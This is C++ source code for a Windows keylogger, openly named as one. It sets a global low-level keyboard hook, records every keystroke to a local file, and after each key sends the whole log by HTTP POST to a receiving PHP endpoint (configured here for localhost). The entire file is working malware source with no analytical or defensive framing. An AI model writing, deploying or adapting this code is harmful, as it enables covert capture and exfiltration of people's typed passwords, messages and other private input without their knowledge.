#include <iostream>
#include <fstream>
#include <windows.h>
#include <wininet.h>
#include <sstream>

#pragma comment(lib, "wininet.lib")

void sendToServer(const std::string& data) {
  HINTERNET hInternet = InternetOpenA("Keylogger", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
  if (!hInternet) return;

  HINTERNET hConnect = InternetConnectA(hInternet, "localhost", 8000,  // make sure this matches your PHP server port
                                        NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
  if (!hConnect) {
    InternetCloseHandle(hInternet);
    return;
  }

  const char* parrAcceptTypes[] = {"*/*", NULL};
  HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/receive.php", NULL, NULL,
                                        parrAcceptTypes, INTERNET_FLAG_RELOAD, 0);

  if (hRequest) {
    std::string postData = "data=" + data;
    const char* headers = "Content-Type: application/x-www-form-urlencoded";
    HttpSendRequestA(hRequest, headers, strlen(headers), (LPVOID)postData.c_str(), postData.size());
    InternetCloseHandle(hRequest);
  }

  InternetCloseHandle(hConnect);
  InternetCloseHandle(hInternet);
}

void logkeyStroke(int key) {
  std::ofstream logfile;
  logfile.open("keylog.txt", std::ios::app);

  if (key == VK_BACK)
    logfile << "[BACKSPACE]";
  else if (key == VK_RETURN)
    logfile << "[ENTER]";
  else if (key == VK_SPACE)
    logfile << " ";
  else if (key == VK_TAB)
    logfile << "[TAB]";
  else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT)
    logfile << "[SHIFT]";
  else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL)
    logfile << "[CTRL]";
  else if (key == VK_ESCAPE)
    logfile << "[ESC]";
  else if (key == VK_OEM_PERIOD)
    logfile << ".";
  else if (key >= 'A' && key <= 'Z')
    logfile << char(key);  // Log the uppercase letter
  else if (key >= '0' && key <= '9')
    logfile << char(key);  // Log the number
  else if (key >= 32 && key <= 126)
    logfile << char(key);  // printable ASCII
  else
    logfile << "[" << key << "]";


  logfile.close();

  // Send current contents of keylog.txt to server
  std::ifstream file("keylog.txt");
  std::stringstream buffer;
  buffer << file.rdbuf();
  file.close();

  sendToServer(buffer.str());
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam , LPARAM lParam){
  if(nCode >= 0 && wParam == WM_KEYDOWN){
    KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
    int key = pKeyBoard->vkCode;  
    logkeyStroke(key);
  }
  return CallNextHookEx(NULL,nCode,wParam,lParam);
}

int main(){
  HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

  MSG msg;

  while(GetMessage(&msg, NULL, 0, 0)){
    TranslateMessage(&msg);
    DispatchMessage(&msg);
  }

  UnhookWindowsHookEx(keyboardHook);
  return 0;
}
